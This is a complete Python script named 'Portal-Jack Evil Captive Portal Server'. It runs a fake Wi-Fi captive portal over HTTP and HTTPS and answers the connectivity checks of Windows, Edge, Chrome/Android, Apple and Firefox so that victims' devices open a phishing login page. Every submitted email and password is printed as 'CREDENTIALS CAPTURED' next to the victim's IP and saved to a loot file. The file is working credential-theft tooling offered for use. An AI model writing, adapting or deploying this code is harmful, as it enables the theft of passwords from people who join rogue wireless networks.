#!/usr/bin/env python3
"""
Portal-Jack — Evil Captive Portal Server
Author: Hackazillarex

Serves a fake captive portal login page and captures credentials.
Runs on BOTH HTTP (80) and HTTPS (443) simultaneously.
Handles OS connectivity checks to trigger captive portal detection.
HTTPS uses an auto-generated self-signed cert so we catch browsers
that force HTTPS on spoofed domains.

Usage: sudo python3 server.py
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
import datetime
import os
import ssl
import subprocess
import threading

LOOT_FILE = "loot.txt"
PORTAL_DIR = os.path.dirname(os.path.abspath(__file__))
CERT_FILE = os.path.join(PORTAL_DIR, "cert.pem")
KEY_FILE = os.path.join(PORTAL_DIR, "key.pem")


def generate_cert():
    """Auto-generate a self-signed cert if one doesn't exist."""
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return
    print("[*] Generating self-signed certificate...")
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", KEY_FILE, "-out", CERT_FILE,
        "-days", "365", "-nodes",
        "-subj", "/CN=Portal"
    ], check=True, capture_output=True)
    print("[*] Certificate generated.")


def serve_portal(handler):
    """Serve the portal login page."""
    handler.send_response(200)
    handler.send_header("Content-Type", "text/html")
    handler.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
    handler.end_headers()
    with open(os.path.join(PORTAL_DIR, "portal.html"), "rb") as f:
        handler.wfile.write(f.read())


class PortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split("?")[0].lower()

        # ===== WINDOWS NCSI =====
        if path == "/connecttest.txt":
            self.log_message(f"[*] NCSI probe from {self.client_address[0]} — sending 302 to trigger portal")
            self.send_response(302)
            self.send_header("Location", "http://www.msftconnecttest.com/redirect")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            return

        if path == "/ncsi.txt":
            self.log_message(f"[*] Legacy NCSI probe from {self.client_address[0]} — sending 302")
            self.send_response(302)
            self.send_header("Location", "http://www.msftncsi.com/redirect")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            return

        if path == "/redirect":
            self.log_message(f"[*] PORTAL SERVED to {self.client_address[0]} via /redirect")
            serve_portal(self)
            return

        # ===== EDGE BROWSER =====
        if path.startswith("/captiveportal"):
            self.log_message(f"[*] Edge captive portal probe from {self.client_address[0]} — sending 302")
            self.send_response(302)
            self.send_header("Location", "http://edge-http.microsoft.com/portal")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            return

        # ===== CHROME / ANDROID =====
        if path in ("/generate_204", "/gen_204"):
            self.log_message(f"[*] Chrome/Android probe from {self.client_address[0]}")
            serve_portal(self)
            return

        # ===== APPLE =====
        if path in ("/hotspot-detect.html", "/library/test/success.html"):
            self.log_message(f"[*] Apple probe from {self.client_address[0]}")
            serve_portal(self)
            return

        # ===== FIREFOX =====
        if path in ("/success.txt", "/canonical.html"):
            self.log_message(f"[*] Firefox probe from {self.client_address[0]}")
            serve_portal(self)
            return

        if path in ("/portal", "/portal/"):
            serve_portal(self)
            return

        if path == "/online":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(b"Microsoft Connect Test")
            return

        # Default — serve portal for any unknown path (HTTP or HTTPS)
        self.log_message(f"[*] Catch-all serving portal to {self.client_address[0]} for {path}")
        serve_portal(self)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        data = parse_qs(body)

        email = data.get("email", [""])[0]
        password = data.get("password", [""])[0]
        timestamp = datetime.datetime.now().isoformat()
        source_ip = self.client_address[0]

        print()
        print("=" * 50)
        print(f"  [!] CREDENTIALS CAPTURED")
        print(f"  Time:     {timestamp}")
        print(f"  Email:    {email}")
        print(f"  Password: {password}")
        print(f"  Victim:   {source_ip}")
        print("=" * 50)
        print()

        with open(os.path.join(PORTAL_DIR, LOOT_FILE), "a") as f:
            f.write(f"{timestamp} | {email} | {password} | {source_ip}\n")

        self.send_response(302)
        self.send_header("Location", f"http://{self.headers['Host']}/online")
        self.end_headers()

    def log_message(self, format, *args):
        if "[*]" in str(format) or "[!]" in str(format):
            print(format % args if args else format)


def run_http():
    server = HTTPServer(("0.0.0.0", 80), PortalHandler)
    print(f"  [+] HTTP  server on port 80")
    server.serve_forever()


def run_https():
    server = HTTPServer(("0.0.0.0", 443), PortalHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    print(f"  [+] HTTPS server on port 443")
    server.serve_forever()


if __name__ == "__main__":
    generate_cert()
    print(f"""
╔══════════════════════════════════════════════╗
║          Portal-Jack Evil Portal (v7)        ║
║          by Hackazillarex                    ║
╠══════════════════════════════════════════════╣
║  Loot file: {LOOT_FILE}                      ║
║                                              ║
║  Waiting for captive portal triggers...      ║
╚══════════════════════════════════════════════╝
""")

    # Run HTTP and HTTPS servers in parallel threads
    http_thread = threading.Thread(target=run_http, daemon=True)
    https_thread = threading.Thread(target=run_https, daemon=True)

    http_thread.start()
    https_thread.start()

    try:
        # Keep main thread alive
        http_thread.join()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
